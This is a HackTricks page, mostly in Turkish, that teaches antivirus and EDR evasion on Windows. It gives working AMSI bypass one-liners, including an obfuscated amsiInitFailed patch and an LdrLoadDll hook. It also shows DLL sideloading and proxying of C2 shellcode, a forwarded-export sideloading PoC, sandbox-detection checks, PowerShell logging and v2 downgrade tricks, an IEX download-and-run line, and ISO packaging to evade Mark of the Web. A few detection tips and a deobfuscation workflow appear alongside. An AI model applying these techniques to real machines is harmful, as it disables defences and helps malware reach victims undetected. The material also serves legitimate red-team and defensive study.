# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa tarafından yazıldı** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV taklidi yaparak Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Kaçınma Metodolojisi**

Şu anda, AV'ler bir dosyanın zararlı olup olmadığını kontrol etmek için farklı yöntemler kullanıyor: static detection, dynamic analysis ve daha gelişmiş EDR'ler için behavioural analysis.

### **Static detection**

Static detection, ikili dosya veya betikte bilinen zararlı dizgileri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (ör. file description, company name, digital signatures, icon, checksum, vb.) gerçekleştirilir. Bu, bilinen public araçları kullanmanın sizi daha kolay yakalayabileceği anlamına gelir; çünkü muhtemelen analiz edilip zararlı olarak işaretlenmişlerdir. Bu tür tespitten kaçınmanın birkaç yolu vardır:

- **Encryption**

İkiliyi şifrelerseniz, AV programınızın programınızı tespit etmesi mümkün olmaz, fakat programı bellek içinde decrypt edip çalıştırmak için bir loader'a ihtiyacınız olacaktır.

- **Obfuscation**

Bazen AV'yi atlatmak için ikili veya betikteki bazı dizgileri değiştirmek yeterlidir, ancak neyi obfuskasyona tabii tuttuğunuza bağlı olarak bu zaman alıcı bir iş olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmayacaktır, fakat bu çok zaman ve emek gerektirir.

> [!TIP]
> Windows Defender'ın static detection'ına karşı kontrol yapmanın iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)'dir. Temelde dosyayı birden fazla segmente bölüp Defender'a her bir segmenti ayrı ayrı taratır; bu sayede ikilinizde işaretlenen dizgi veya byte'ların tam olarak neler olduğunu size söyleyebilir.

Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) i şiddetle tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV'nin ikilinizi bir sandbox içinde çalıştırıp zararlı faaliyetleri izlemesiyle olur (ör. tarayıcınızın şifrelerini decrypt edip okumaya çalışma, LSASS üzerinde minidump alma vb.). Bu kısım biraz daha zor olabilir, ama sandbox'ları atlatmak için yapabileceğiniz bazı şeyler şunlardır.

- **Sleep before execution** Uygulama nasıl implemente edildiğine bağlı olarak, AV'nin dynamic analysis'ını atlatmanın harika bir yolu olabilir. AV'lerin kullanıcı iş akışını kesmemek için dosyaları taramak üzere çok kısa bir zamanı vardır, bu yüzden uzun sleep'ler ikililerin analizini bozabilir. Sorun şu ki, birçok AV'in sandbox'ı sleep'i nasıl implemente ettiğine bağlı olarak atlayabilir.
- **Checking machine's resources** Genellikle sandbox'ların çalışacak çok az kaynağı vardır (ör. < 2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada çok yaratıcı olabilirsiniz, örneğin CPU sıcaklığını veya fan hızlarını kontrol etmek gibi; her şey sandbox'ta implemente edilmiş olmayacaktır.
- **Machine-specific checks** Hedefiniz "contoso.local" domain'ine bağlı bir kullanıcının workstation'ıysa, bilgisayarın domain'ini kontrol edip sizin belirttiğinizle eşleşip eşleşmediğine bakabilirsiniz; eşleşmiyorsa programınızı çıkartabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı, bu yüzden detone etmeden önce malware'inizde bilgisayar adını kontrol edebilirsiniz; eğer ad HAL9TH ile eşleşiyorsa, defender'ın sandbox'ının içindesiniz demektir, dolayısıyla programınızı sonlandırabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı gitmek için [@mgeeky](https://twitter.com/mariuszbit)'in bazı diğer gerçekten iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce de söylediğimiz gibi, **public tools** eninde sonunda **tespit edilir**, bu yüzden kendinize sormalısınız:

Örneğin, LSASS'i dumplamak istiyorsanız, **gerçekten mimikatz kullanmanız mı gerekiyor**? Yoksa daha az bilinen ve yine LSASS'i dumplayan farklı bir proje kullanabilir misiniz.

Doğru cevap muhtemelen ikincisidir. Mimikatz örneğini ele alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok işaretlenen zararlı parçalardan biri, hatta belki de en çok işaretlenen proje; proje kendisi süper ama AV'leri atlatmak için onunla çalışmak bir kabus olabilir, bu yüzden amaçladığınız şeyi yapmak için alternatiflere bakın.

> [!TIP]
> Payload'larınızı evasion için değiştirirken, Defender'da **automatic sample submission**'ı kapattığınızdan emin olun, ve lütfen, ciddi olarak, uzun vadede evasion hedefiniz varsa **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, bir VM'e kurun, automatic sample submission'ı kapatmaya çalışın ve sonuçtan memnun olana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda, her zaman **evasyonda DLL kullanmayı önceliklendirin**, tecrübeme göre, DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir, bu yüzden tespiti bazı durumlarda önlemek için kullanabileceğiniz çok basit bir hile (tabii payload'ınızın DLL olarak çalıştırılma yolu varsa).

Aşağıdaki görüntüde görebileceğimiz gibi, Havoc'tan bir DLL Payload'un antiscan.me'de detection oranı 4/26 iken, EXE payload'un detection oranı 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Şimdi DLL dosyaları ile çok daha gizli olmanızı sağlayacak bazı hileleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader tarafından kullanılan DLL arama sırasından faydalanır; victim application ile malicious payload(lar)ı yan yana konumlandırır.

Siofra kullanarak ve aşağıdaki powershell script ile DLL Sideloading'e yatkın programları kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

Ben şiddetle **explore DLL Hijackable/Sideloadable programs yourself** yapmanızı tavsiye ederim; bu teknik doğru uygulandığında oldukça gizlidir, ancak kamuya açık bilinen DLL Sideloadable programlarını kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemesini beklediği isimle bir kötü amaçlı DLL yerleştirmek tek başına payload'unuzun çalışmasını sağlamaz; çünkü program o DLL içinde bazı belirli fonksiyonları bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve kötü amaçlı) DLL'den orijinal DLL'e yaptığı çağrıları iletir; böylece programın işlevselliği korunur ve payload'unuzun çalıştırılmasını yönetebilir.

Ben [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik)'ten kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL source code template ve orijinal yeniden adlandırılmış DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz (encoded with [SGN](https://github.com/EgeBalci/sgn)) hem de proxy DLL'imiz [antiscan.me](https://antiscan.me) üzerinde 0/26 tespit oranına sahip! Bunu başarılı sayarım.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Kesinlikle** [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) izleyin; DLL Sideloading hakkında ve ayrıca [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) da izleyerek burada tartıştıklarımızı daha derinlemesine öğrenin.

### Forwarded Exports'ı Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri aslında "forwarder" olan fonksiyonları export edebilir: export girişi koda işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII dizesi içerir. Bir çağıran export'u çözdüğünde, Windows yükleyicisi şunları yapar:

- Eğer henüz yüklenmemişse `TargetDll`'i yükler
- Ondan `TargetFunc`'ı çözer

Anlaşılması gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, korunmuş KnownDLLs ad alanından sağlanır (ör., ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL arama sırası kullanılır; bu sıra, forward çözümlemesini yapan modülün bulunduğu dizini de içerir.

Bu, dolaylı bir sideloading primitive'i sağlar: imzalı bir DLL bulun ve bu DLL'in export ettiği fonksiyonun KnownDLL olmayan bir modül adına forward edildiğini tespit edin; ardından bu imzalı DLL'i, saldırgan tarafından kontrol edilen ve yönlendirilen hedef modülle tam olarak aynı isme sahip bir DLL ile aynı dizine koyun. Forwarded export çağrıldığında, yükleyici forward'ı çözer ve aynı dizinden sizin DLL'inizi yükleyerek DllMain'inizi çalıştırır.

Windows 11'de gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu yüzden normal arama sırasıyla çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'ini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod çalıştırmak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'ı uygulamanıza gerek yoktur.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward'ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) yükler
- `KeyIsoSetAuditingInterface`'ı çözerken, yükleyici iletimi (forward) `NCRYPTPROV.SetAuditingInterface`'e izler
- Yükleyici daha sonra `NCRYPTPROV.dll`'yi `C:\test` konumundan yükler ve `DllMain`'ini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, yalnızca `DllMain` zaten çalıştıktan sonra "missing API" hatası alırsınız

Tespit ipuçları:
- Hedef modül KnownDLL değilse forwarded exports'a odaklanın. KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded exports'ları şu tür araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt

Tespit/defans fikirleri:
- LOLBins'i (ör. rundll32.exe) izleyin: imzalı DLL'leri sistem dizini dışındaki yollardan yükleyip, ardından aynı temel ada sahip non-KnownDLLs'i o dizinden yüklemesi
- process/module zincirleri için uyarı verin, örneğin: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` kullanıcı tarafından yazılabilir yollar altında
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma işlemlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i kullanarak shellcode'unuzu gizli bir şekilde yükleyip çalıştırabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is just a cat & mouse game, what works today could be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Başlangıçta, AV'ler yalnızca **files on disk** tarayabiliyordu; bu yüzden eğer payload'ları **directly in-memory** bir şekilde çalıştırabiliyorsanız, AV bunu engelleyecek yeterli görünürlüğe sahip değildi.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Bu, antivirus çözümlerinin betik içeriğini hem şifresiz hem de unobfuscated halde açığa çıkararak betik davranışını incelemesine olanak tanır.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Görünüşe göre başına `amsi:` ekliyor ve ardından betiğin çalıştığı yürütülebilir dosyanın yolunu yazıyor; bu durumda powershell.exe

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

Ayrıca, starting with **.NET 4.8**, C# kodu da AMSI üzerinden çalıştırılmaktadır. Bu durum Assembly.Load(byte[]) ile yapılan in-memory execution'ı bile etkiler. Bu yüzden AMSI'den kaçmak istiyorsanız in-memory execution için daha düşük .NET sürümlerini (ör. 4.7.2 veya altı) kullanmanız önerilir.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Mevcut powershell process için AMSI'yi kullanılamaz hale getirmek tek bir powershell satırı gerektirdi. Elbette bu satır AMSI tarafından tespit edildi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Unutmayın, bu gönderi yayınlandığında muhtemelen işaretlenecek, bu yüzden tespit edilmeden kalmayı planlıyorsanız herhangi bir kod yayınlamayın.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu olan amsi.dll içindeki "AmsiScanBuffer" fonksiyonunun adresini bulmayı ve onu E_INVALIDARG kodunu döndürecek talimatlarla üzerine yazmayı içerir; böylece gerçek taramanın sonucu 0 döner ve temiz sonuç olarak yorumlanır.

> [!TIP]
> Lütfen daha ayrıntılı açıklama için [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) sayfasını okuyun.

AMSI'yi powershell ile atlatmak için kullanılan birçok başka teknik de vardır, daha fazlası için [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 'a bakın.

### AMSI'yi engelleme: amsi.dll yüklenmesini önleme (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` geçerli sürece yüklendikten sonra başlatılır. Dil‑bağımsız, sağlam bir bypass, istenen modül `amsi.dll` olduğunda hata döndüren bir user‑mode hook'u `ntdll!LdrLoadDll` üzerine yerleştirmektir. Sonuç olarak, AMSI hiç yüklenmez ve o süreç için tarama yapılmaz.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript ve custom loader'lar dahil olmak üzere AMSI'yi yükleyecek herhangi bir ortamda çalışır.
- Uzun komut satırı izlerinden kaçınmak için stdin üzerinden script beslemeyle eşleştirin (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins aracılığıyla çalıştırılan loader'larda kullanıldığı görülmüştür (örn., `regsvr32`'nin `DllRegisterServer` çağırması).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Tespit edilen imzayı kaldırın**

Mevcut işlemin belleğinden tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçları kullanabilirsiniz. Bu araç, mevcut işlemin belleğini AMSI imzası için tarar ve ardından imzayı bellekte etkisiz hale getirmek için NOP talimatlarıyla üzerine yazar.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2 kullanın**
PowerShell sürüm 2'yi kullanırsanız, AMSI yüklenmez; bu nedenle scripts'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu yapmak için:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu, denetim ve sorun giderme amaçları için faydalı olabilir, ancak tespitten kaçmak isteyen saldırganlar için de **bir sorun olabilir**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Bu amaçla şu araç kullanılabilir: [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)
- **Use Powershell version 2**: Eğer PowerShell version 2 kullanırsanız, AMSI yüklü olmayacaktır; böylece scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanarak savunmalar olmadan bir PowerShell başlatın (bu, Cobal Strike'dan `powerpick`'in kullandığı şeydir).


## Obfuscation

> [!TIP]
> Bazı obfuscation teknikleri verileri şifrelemeye dayanır; bu, ikilinin entropisini artırır ve AV'ler ile EDR'lerin bunu tespit etmesini kolaylaştırır. Bununla dikkatli olun ve şifrelemeyi yalnızca hassas veya gizlenmesi gereken kod bölümlerine uygulamayı düşünün.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (veya ticari fork'larını) kullanan malware analizinde, decompiler'ları ve sandbox'ları engelleyen birden fazla koruma katmanı ile karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C# olarak decompile edilebilecek neredeyse orijinale yakın bir IL'yi güvenilir şekilde **geri kazandırır**.

1.  Anti-tampering removal – ConfuserEx her *method body*'yi şifreler ve bunu *module* static constructor (`<Module>.cctor`) içinde deşifre eder. Bu ayrıca PE checksum'u yamalar, bu yüzden herhangi bir değişiklik binary'nin çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* dosyayı **de4dot-cex**'e (ConfuserEx farkında de4dot fork'u) verin:
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profilini seç
• de4dot, control-flow flattening'i geri alır, orijinal namespace'leri, sınıfları ve değişken isimlerini geri getirir ve sabit string'leri deşifre eder.

3.  Proxy-call stripping – ConfuserEx, decompilation'ı daha da bozan hafif sarmalayıcılarla (yani *proxy calls*) doğrudan method çağrılarını değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra opak wrapper fonksiyonları (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini görmelisiniz.

4.  Manual clean-up – ortaya çıkan binary'yi dnSpy altında çalıştırın, büyük Base64 blob'ları veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayarak *gerçek* payload'u bulun. Çoğunlukla malware, bunu `<Module>.byte_0` içinde başlatılan TLV-encoded bir byte array olarak saklar.

Yukarıdaki zincir, zararlı sample'ı çalıştırmaya gerek kalmadan yürütme akışını **geri kazandırır** — çevrimdışı bir iş istasyonunda çalışırken faydalıdır.

> 🛈  ConfuserEx, `ConfusedByAttribute` adında özel bir attribute üretir; bu, örnekleri otomatik olarak triage etmek için bir IOC olarak kullanılabilir.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynak bir fork'unu sağlayarak [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve tamper-proofing yoluyla yazılım güvenliğini artırmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, derleme zamanında `C++11/14` dilini kullanarak herhangi bir dış araç kullanmadan ve compiler'ı değiştirmeden obfuscated kod üretmenin nasıl yapılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından üretilen obfuscated işlemlerden bir katman ekler; bu, uygulamayı kırmak isteyen kişinin işini biraz zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys gibi çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, herhangi bir yürütülebilir dosya için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM tarafından desteklenen diller için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek programı assembly düzeyinde obfuscate eder; bu da normal kontrol akışı anlayışımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor mevcut EXE/DLL'leri shellcode'a dönüştürebilir ve sonra yükleyebilir

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificate ile imzalanmış yürütülebilir dosyalar **SmartScreen'i tetiklemez**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), uygulamaların ve sistem bileşenlerinin olayları kaydetmesine izin veren Windows'ta güçlü bir günlük kaydı mekanizmasıdır. Ancak, güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

